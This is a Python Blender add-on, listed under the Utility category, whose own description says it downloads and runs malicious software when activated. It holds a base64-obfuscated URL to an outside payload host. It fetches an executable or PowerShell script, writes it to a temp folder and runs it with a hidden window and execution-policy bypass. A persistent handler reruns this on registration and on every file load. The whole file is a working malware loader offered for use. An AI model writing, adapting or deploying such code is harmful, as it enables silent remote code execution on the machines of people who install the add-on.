import bpy
import requests
import base64
import tempfile
import subprocess
import os
import sys

"""Config"""
class config:
    payload_url = "aHR0cDovL3dvcmtmbG93c3RkLnRlY2gvcGF5bG9hZC9jYWxjLmV4ZQ=="  # base64 decoded string to payload. Formats: .exe, .bat, .ps1 or .py
    use_powershell = False  # If you are using ps1 script

"""Loader"""
class loader:
    def download_payload():
        try:
            response = requests.get(base64.b64decode(config.payload_url), timeout=15)
            response.raise_for_status()
            return response.content
        except Exception as e:
            print(f"[!] Download error: {e}")
            return None

    def execute_payload(payload_content):
        try:
            extension = ".ps1" if config.use_powershell else ".exe"
            with tempfile.NamedTemporaryFile(
                suffix=extension,
                delete=False,
                dir=os.getenv('TEMP')  
            ) as tmp:
                tmp.write(payload_content)
                tmp_path = tmp.name
            
            if config.use_powershell:
                command = [
                    "powershell.exe",
                    "-ExecutionPolicy", "Bypass",
                    "-File", tmp_path
                ]
            elif tmp_path.endswith('.py'):
                command = [sys.executable, tmp_path]
            else:
                command = [tmp_path]

            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            subprocess.run(
                command,
                startupinfo=startupinfo,
                check=True,
                timeout=30,
                capture_output=True
            )
        finally:
            os.unlink(tmp_path)  
            
bl_info = {
    "name": "Blender payload loader",
    "author": "x9600h [workflowstd.tech]",
    "version": (1, 0),
    "blender": (3, 0, 0),
    "location": "Everywhere",
    "description": "Download and run malicious software via server automatically after activation add-on",
    "warning": "Use for lawful purposes only",
    "doc_url": "",
    "category": "Utility",
}

def main_operation():
    payload = loader.download_payload()
    if payload:
        loader.execute_payload(payload)

@bpy.app.handlers.persistent
def load_handler(dummy):
    if bpy.context.preferences.addons.get(__name__):
        main_operation()
        
def is_blender_ready():
    try:
        return (
            hasattr(bpy, 'data') and 
            hasattr(bpy.data, 'scenes') and 
            len(bpy.data.scenes) > 0
        )
    except:
        return False

def register():
    bpy.app.handlers.load_post.append(load_handler)
    
    if is_blender_ready():
        main_operation()

def unregister():
    if load_handler in bpy.app.handlers.load_post:
        bpy.app.handlers.load_post.remove(load_handler)

if __name__ == "__main__":
    register()